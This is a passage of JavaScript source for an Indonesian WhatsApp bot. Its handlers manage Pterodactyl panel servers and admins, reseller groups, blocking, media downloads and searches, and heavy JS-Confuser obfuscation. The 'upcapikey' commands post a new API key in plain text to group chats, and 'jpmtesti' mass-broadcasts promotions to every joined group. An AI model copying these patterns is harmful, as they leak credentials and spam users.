    headerType: 1,
    viewOnce: true
  }, { quoted: qtext2 });
}
break;

case "upcapikey-v1": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CADDY_API_KEY`);
  }

  global.capikey = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *Caddy API Key untuk Server V1 berhasil diupdate!*\n\n🔐 *Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan Caddy API Key V1*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

case "upcapikey-v2": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CADDY_API_KEY`);
  }

  global.capikeyV2 = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *Caddy API Key untuk Server V2 berhasil diupdate!*\n\n🔐 *Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan Caddy API Key V2*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetreseller-v2": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply(mess.group)
    
    // Kosongkan array tanpa menugaskan ulang
    pler.length = 0
    fs.writeFileSync('./library/database/idgrup2.json', JSON.stringify(pler, null, 2))
    
    Reply(`*${command} Sukses Menghapus Semua Akses Grup✅*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listreseller-v2": {
    if (!isCreator) return Reply(mess.owner)

    const groupList = JSON.parse(fs.readFileSync('./library/database/idgrup2.json'))
    if (groupList.length === 0) return Reply('📭 *Belum ada grup yang terdaftar.*')

    let text = '*📋 Daftar Group Terdaftar:*\n\n'
    let totalAnggota = 0

    for (let i = 0; i < groupList.length; i++) {
        try {
            let metadata = await conn.groupMetadata(groupList[i])
            let nama = metadata.subject || "Tidak diketahui"
            let anggota = metadata.participants.length || 0
            totalAnggota += anggota

            text += `${i + 1}. ${nama}\n`
            text += `   🆔 ${groupList[i]}\n`
            text += `   👥 Member: ${anggota}\n\n`
        } catch (e) {
            text += `${i + 1}. [❌ Gagal ambil info grup: ${groupList[i]}]\n\n`
        }
    }

    text += `━━━━━━━━━━━━━━\n📊 *Total Grup:* ${groupList.length}\n👥 *Total Member:* ${totalAnggota}`

    Reply(text)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetreseller": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply(mess.group)
    
    // Kosongkan array tanpa menugaskan ulang
    pler.length = 0
    fs.writeFileSync('./library/database/idgrup.json', JSON.stringify(pler, null, 2))
    
    Reply(`*${command} Sukses Menghapus Semua Akses Grup✅*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listreseller": {
    if (!isCreator) return Reply(mess.owner)

    const groupList = JSON.parse(fs.readFileSync('./library/database/idgrup.json'))
    if (groupList.length === 0) return Reply('📭 *Belum ada grup yang terdaftar.*')

    let text = '*📋 Daftar Group Terdaftar:*\n\n'
    let totalAnggota = 0

    for (let i = 0; i < groupList.length; i++) {
        try {
            let metadata = await conn.groupMetadata(groupList[i])
            let nama = metadata.subject || "Tidak diketahui"
            let anggota = metadata.participants.length || 0
            totalAnggota += anggota

            text += `${i + 1}. ${nama}\n`
            text += `   🆔 ${groupList[i]}\n`
            text += `   👥 Member: ${anggota}\n\n`
        } catch (e) {
            text += `${i + 1}. [❌ Gagal ambil info grup: ${groupList[i]}]\n\n`
        }
    }

    text += `━━━━━━━━━━━━━━\n📊 *Total Grup:* ${groupList.length}\n👥 *Total Member:* ${totalAnggota}`

    Reply(text)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "totaladmin-v2": {
    if (!isCreator) return Reply(mess.owner)
    
    let cek = await fetch(domainV2 + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    })
    
    let res2 = await cek.json();
    let users = res2.data;
    
    if (users.length < 1) return m.reply("Tidak ada admin panel")
    
    // Menghitung total admin
    let totalAdmin = users.filter(user => user.attributes.root_admin === true).length;

    let teks = `*乂 Total Admin Panel Pterodactyl 2*\n\nTotal Admin 2: ${totalAdmin}`

    await conn.sendMessage(m.chat, {
        text: teks,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        buttons: [
            { buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel 2' }, type: 1 },
            { buttonId: `.listadmin-v2`, buttonText: { displayText: 'Lihat Semua Admin 2' }, type: 1 }
        ],
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, {quoted: m})
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "totaladmin": {
    if (!isCreator) return Reply(mess.owner)
    
    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    
    let res2 = await cek.json();
    let users = res2.data;
    
    if (users.length < 1) return m.reply("Tidak ada admin panel")
    
    // Menghitung total admin
    let totalAdmin = users.filter(user => user.attributes.root_admin === true).length;

    let teks = `*乂 Total Admin Panel Pterodactyl 1*\n\nTotal Admin 1: ${totalAdmin}`

    await conn.sendMessage(m.chat, {
        text: teks,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        buttons: [
            { buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel 1' }, type: 1 },
            { buttonId: `.listadmin`, buttonText: { displayText: 'Lihat Semua Admin 1' }, type: 1 }
        ],
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, {quoted: m})
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "totalpanel-v2": {  
    if (!isCreator) return Reply(mess.owner);  
    let f = await fetch(domainV2 + "/api/application/servers?page=1", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikeyV2  
        }  
    });  
    let res = await f.json();  
    let totalServers = res.meta.pagination.total; // Mengambil total jumlah server  

    await conn.sendMessage(m.chat, {  
        text: `Total Server Panel 2: *${totalServers}*`,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        buttons: [
            { buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel 2' }, type: 1 },
            { buttonId: `.delallserver-v2`, buttonText: { displayText: 'Hapus All Server Panel 2' }, type: 1 }
        ],
        contextInfo: {  
            isForwarded: true,   
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],   
        },  
    }, {quoted: m});  
}  
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "totalpanel": {  
    if (!isCreator) return Reply(mess.owner);  
    let f = await fetch(domain + "/api/application/servers?page=1", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikey  
        }  
    });  
    let res = await f.json();  
    let totalServers = res.meta.pagination.total; // Mengambil total jumlah server  

    await conn.sendMessage(m.chat, {  
        text: `Total Server Panel 1: *${totalServers}*`,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        buttons: [
            { buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel 1' }, type: 1 },
            { buttonId: `.delallserver`, buttonText: { displayText: 'Hapus All Server Panel 1' }, type: 1 }
        ],
        contextInfo: {  
            isForwarded: true,   
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],   
        },  
    }, {quoted: m});  
}  
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "createserver": case "csrv": {
  try {
    if (!isCreator && !jangan) return Reply(mess.owner)
    if (!text) return m.reply("Contoh: .csrv username,server,ram")

    let [userquery, namesrv, ramopt] = text.split(",").map(a => a.trim())
    if (!userquery || !namesrv || !ramopt) return m.reply("Format salah! Contoh: .csrv username,server,2gb")

    ramopt = ramopt.toLowerCase()

    // Atur spesifikasi RAM, Disk, dan CPU sesuai pilihan
    let ram, disknya, cpu
    if (ramopt == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (ramopt == "2gb") { ram="2000"; disknya="2000"; cpu="60" }
    else if (ramopt == "3gb") { ram="3000"; disknya="3000"; cpu="80" }
    else if (ramopt == "4gb") { ram="4000"; disknya="4000"; cpu="100" }
    else if (ramopt == "5gb") { ram="5000"; disknya="5000"; cpu="120" }
    else if (ramopt == "6gb") { ram="6000"; disknya="6000"; cpu="140" }
    else if (ramopt == "7gb") { ram="7000"; disknya="7000"; cpu="160" }
    else if (ramopt == "8gb") { ram="8000"; disknya="8000"; cpu="180" }
    else if (ramopt == "9gb") { ram="9000"; disknya="9000"; cpu="200" }
    else if (ramopt == "10gb") { ram="10000"; disknya="10000"; cpu="220" }
    else if (ramopt == "unli" || ramopt == "unlimited") { ram="0"; disknya="0"; cpu="0" }
    else return m.reply("❌ Pilihan RAM tidak valid! Pilih antara 1GB sampai 10GB atau 'unlimited'.")

    // Cari user (loop page)
    let user = null
    let page = 1
    while (true) {
      let fUser = await fetch(`${domain}/api/application/users?page=${page}&per_page=100`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikey
        }
      })
      let dataUser = await fUser.json()
      if (!dataUser.data || dataUser.data.length == 0) break

      user = dataUser.data.find(u => 
        u.attributes.username.toLowerCase() === userquery.toLowerCase() ||
        u.attributes.email.toLowerCase() === userquery.toLowerCase()
      )
      if (user) break
      page++
    }

    if (!user) return m.reply(`❌ User '${userquery}' tidak ditemukan di panel.`)

    let usr_id = user.attributes.id
    console.log("Ditemukan user id:", usr_id, "username:", user.attributes.username, "email:", user.attributes.email)

    let desc = tanggal(Date.now())

    // Ambil startup cmd
    let f1 = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    })
    let data2 = await f1.json()
    let startup_cmd = data2.attributes.startup

    // Buat server
    let f2 = await fetch(domain + "/api/application/servers", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      },
      body: JSON.stringify({
        name: namesrv,
        description: desc,
        user: usr_id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk: disknya,
          io: 500,
          cpu: cpu
        },
        feature_limits: { databases: 5, backups: 5, allocations: 5 },
        deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
      })
    })

    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    let teks = `✅ *Berhasil membuat server!*

📡 *ID Server:* ${server.id}
🖥 *Nama:* ${namesrv}
👤 *Untuk user:* ${user.attributes.username} (${user.attributes.email})

🌐 *Spesifikasi:*
• RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
• Disk: ${disknya == "0" ? "Unlimited" : disknya / 1000 + "GB"}
• CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}

🌍 ${global.domain}`

    await m.reply(teks)

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "createserver2": case "csrv2": {
  try {
    if (!isCreator && !jangan) return Reply(mess.owner)
    if (!text) return m.reply("Contoh: .csrv2 username,server,ram")

    let [userquery, namesrv, ramopt] = text.split(",").map(a => a.trim())
    if (!userquery || !namesrv || !ramopt) return m.reply("Format salah! Contoh: .csrv2 username,server,2gb")

    ramopt = ramopt.toLowerCase()

    // Atur spesifikasi RAM, Disk, dan CPU sesuai pilihan
    let ram, disknya, cpu
    if (ramopt == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (ramopt == "2gb") { ram="2000"; disknya="2000"; cpu="60" }
    else if (ramopt == "3gb") { ram="3000"; disknya="3000"; cpu="80" }
    else if (ramopt == "4gb") { ram="4000"; disknya="4000"; cpu="100" }
    else if (ramopt == "5gb") { ram="5000"; disknya="5000"; cpu="120" }
    else if (ramopt == "6gb") { ram="6000"; disknya="6000"; cpu="140" }
    else if (ramopt == "7gb") { ram="7000"; disknya="7000"; cpu="160" }
    else if (ramopt == "8gb") { ram="8000"; disknya="8000"; cpu="180" }
    else if (ramopt == "9gb") { ram="9000"; disknya="9000"; cpu="200" }
    else if (ramopt == "10gb") { ram="10000"; disknya="10000"; cpu="220" }
    else if (ramopt == "unli" || ramopt == "unlimited") { ram="0"; disknya="0"; cpu="0" }
    else return m.reply("❌ Pilihan RAM tidak valid! Pilih antara 1GB sampai 10GB atau 'unlimited'.")

    // Cari user (loop page)
    let user = null
    let page = 1
    while (true) {
      let fUser = await fetch(`${domainV2}/api/application/users?page=${page}&per_page=100`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikeyV2
        }
      })
      let dataUser = await fUser.json()
      if (!dataUser.data || dataUser.data.length == 0) break

      user = dataUser.data.find(u => 
        u.attributes.username.toLowerCase() === userquery.toLowerCase() ||
        u.attributes.email.toLowerCase() === userquery.toLowerCase()
      )
      if (user) break
      page++
    }

    if (!user) return m.reply(`❌ User '${userquery}' tidak ditemukan di panel.`)

    let usr_id = user.attributes.id
    console.log("Ditemukan user id:", usr_id, "username:", user.attributes.username, "email:", user.attributes.email)

    let desc = tanggal(Date.now())

    // Ambil startup cmd
    let f1 = await fetch(`${domainV2}/api/application/nests/${nestid}/eggs/${egg}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      }
    })
    let data2 = await f1.json()
    let startup_cmd = data2.attributes.startup

    // Buat server
    let f2 = await fetch(domainV2 + "/api/application/servers", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      },
      body: JSON.stringify({
        name: namesrv,
        description: desc,
        user: usr_id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk: disknya,
          io: 500,
          cpu: cpu
        },
        feature_limits: { databases: 5, backups: 5, allocations: 5 },
        deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
      })
    })

    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    let teks = `✅ *Berhasil membuat server!*

📡 *ID Server:* ${server.id}
🖥 *Nama:* ${namesrv}
👤 *Untuk user:* ${user.attributes.username} (${user.attributes.email})

🌐 *Spesifikasi:*
• RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
• Disk: ${disknya == "0" ? "Unlimited" : disknya / 1000 + "GB"}
• CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}

🌍 ${global.domainV2}`

    await m.reply(teks)

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "unblock");
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
 if (!isCreator) return Reply(global.mess.owner)
 if (!text) return m.reply(example("teks dengan mengirim foto"))
 if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))

 const allgrup = await conn.groupFetchAllParticipating()
 const res = await Object.keys(allgrup)
 let count = 0
 const teks = text
 const jid = m.chat
 const rest = await conn.downloadAndSaveMediaMessage(qmsg)

 await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup...`)
 await conn.sendMessage(global.idSaluran, {
 image: await fs.readFileSync(rest),
 caption: teks
 })

 for (let i of res) {
 if (global.db.groups[i] && global.db.groups[i].blacklistjpm === true) continue
 try {
 await conn.sendMessage(i, {
 caption: `\n${teks}\n`,
 image: await fs.readFileSync(rest),
 footer: `© 2025 ${botname} 🚀`,
 buttons: [
 {
 buttonId: `.produk`,
 buttonText: { displayText: '🛍️ Lihat Produk' },
 type: 1
 },
 {
 buttonId: `.owner`,
 buttonText: { displayText: '👤 Owner' },
 type: 1
 }
 ],
 headerType: 4,
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran
 }
 }
 }, { quoted: qtoko })
 count += 1
 } catch (e) {
 console.log(`Gagal kirim ke ${i}`)
 }
 await sleep(global.delayJpm)
 }

 await fs.unlinkSync(rest)
 await conn.sendMessage(jid, {
 text: `✅ Testimoni berhasil dikirim ke dalam channel & ${count} grup.`
 }, { quoted: m })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// FITUR DI BAWAH INI API SEDANG EROR//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// FITUR DI BAWAH INI API SEDANG EROR//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
    if (!text) return m.reply(example("logo whatsapp"));

    await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    try {
        const res = await fetchJson(`https://flowfalcon.dpdns.org/search/gimage?q=${encodeURIComponent(text)}`);

        if (!res.status) return m.reply("Error: Gagal mendapatkan data gambar.");

        if (!res.result || !Array.isArray(res.result) || res.result.length === 0) {
            return m.reply("Maaf, hasil pencarian gambar tidak ditemukan.");
        }

        let aray = res.result.length < 5 ? res.result : res.result.slice(0, 5);
        let total = 0;

        for (let i of aray) {
            // Asumsi properti gambar ada di i.image atau i.url
            let imageUrl = i.image || i.url;
            if (!imageUrl) continue;

            await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Hasil pencarian foto ke ${++total}` }, { quoted: m });
        }

    } catch (e) {
        console.error("Error saat pencarian gambar:", e);
        m.reply("Terjadi kesalahan saat menghubungi API.");
    } finally {
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// FITUR DI BAWAH INI API SEDANG EROR//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxx": {
    if (!text) return m.reply("Masukkan kata kunci pencarian, contoh: .xnxx video lucu");

    try {
        const url = `https://flowfalcon.dpdns.org/search/xnxx?query=${encodeURIComponent(text)}`;
        const res = await fetchJson(url);

        if (!res.status || !Array.isArray(res.result) || res.result.length === 0) {
            return m.reply("Maaf, hasil pencarian tidak ditemukan.");
        }

        let reply = `*Hasil pencarian untuk:* ${text}\n\n`;
        const maxResults = 5; // batasi hasil

        res.result.slice(0, maxResults).forEach((item, index) => {
            reply += `*${index + 1}. ${item.title}*\n`;
            reply += `Info: ${item.info.trim()}\n`;
            reply += `Link: ${item.link}\n\n`;
        });

        await m.reply(reply);
    } catch (e) {
        console.error("Error saat pencarian xnxx:", e);
        m.reply("Gagal mencari data.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// FITUR DI BAWAH INI API SEDANG EROR//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "animesearch": {
 if (!text) return m.reply(`Contoh penggunaan: .${prefix}solo leveling`)
 
 try {
 // Show loading indicator
 await m.reply('🔍 Mencari anime...')
 
 // Make API request
 const apiUrl = `https://flowfalcon.dpdns.org/anime/search?q=${encodeURIComponent(text)}`
 const { data } = await axios.get(apiUrl)
 
 if (!data.status || !data.result || data.result.length === 0) {
 return m.reply('Tidak ditemukan hasil untuk anime tersebut.')
 }
 
 // Format the results
 let replyText = `🎌 *Hasil Pencarian Anime* 🎌\n\n`
 data.result.forEach((anime, index) => {
 replyText += `*${index + 1}. ${anime.title}*\n`
 replyText += `├ Tipe: ${anime.type || 'Tidak diketahui'}\n`
 replyText += `├ Status: ${anime.status || 'Tidak diketahui'}\n`
 replyText += `└ Link: ${anime.link}\n\n`
 })
 
 // Send first result with image
 const firstResult = data.result[0]
 await conn.sendMessage(m.chat, {
 image: { url: firstResult.image },
 caption: replyText
 }, { quoted: m })
 
 } catch (error) {
 console.error('Error searching anime:', error)
 m.reply('Gagal melakukan pencarian anime. Silakan coba lagi nanti.')
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await conn.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// FITUR DI BAWAH INI API SEDANG EROR//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./library/database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./library/database/sampah/${filename}`).toString(), {
 target: "node",
 preset: "high",
 calculator: true,
 compact: true,
 hexadecimalNumbers: true,
 controlFlowFlattening: 0.75,
 deadCode: 0.2,
 dispatcher: true,
 duplicateLiteralsRemoval: 0.75,
 flatten: true,
 globalConcealing: true,
 identifierGenerator: "randomized",
 minify: true,
 movedDeclarations: true,
 objectExtraction: true,
 opaquePredicates: 0.75,
 renameVariables: true,
 renameGlobals: true,
 shuffle: { hash: 0.5, true: 0.5 },
 stack: true,
 stringConcealing: true,
 stringCompression: true,
 stringEncoding: true,
 stringSplitting: 0.75,
 rgf: false
}).then(async (obfuscated) => {
 await fs.writeFileSync(`./library/database/sampah/${filename}`, obfuscated)
 await conn.sendMessage(m.chat, {document: fs.readFileSync(`./library/database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
 await fs.unlinkSync(`./library/database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// FITUR DI BAWAH INI API SEDANG EROR//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
